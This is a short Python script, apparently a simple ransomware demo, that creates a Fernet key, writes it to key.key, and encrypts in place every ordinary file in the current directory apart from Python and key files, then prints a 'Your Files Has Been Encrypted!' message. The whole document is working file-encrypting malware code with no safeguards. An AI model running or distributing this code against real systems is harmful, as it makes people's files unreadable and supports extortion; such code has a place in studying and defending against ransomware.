#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = os.listdir()
targets = []


# Generate encryption key and save it to text file
key = Fernet.generate_key()
key_file = open('key.key', 'wb')
key_file.write(key)
key_file.close()


# Get all files from the current directory
for file in files:

    file_extension = os.path.splitext(file)

    # Execlude Python scripts & key from decryption
    if file.lower().endswith(('.py', '.key')):
        continue

    # Execlude directories from encryption
    if os.path.isdir(os.path.abspath(file)):
        continue
    
    targets.append(file)

    with open(file, 'rb') as the_file:
        file_content = the_file.read()

    encrypted_content = Fernet(key).encrypt(file_content)

    with open(file, 'wb') as the_file:
        the_file.write(encrypted_content)

print('SORRY :( ...... Your Files Has Been Encrypted!')







    


    
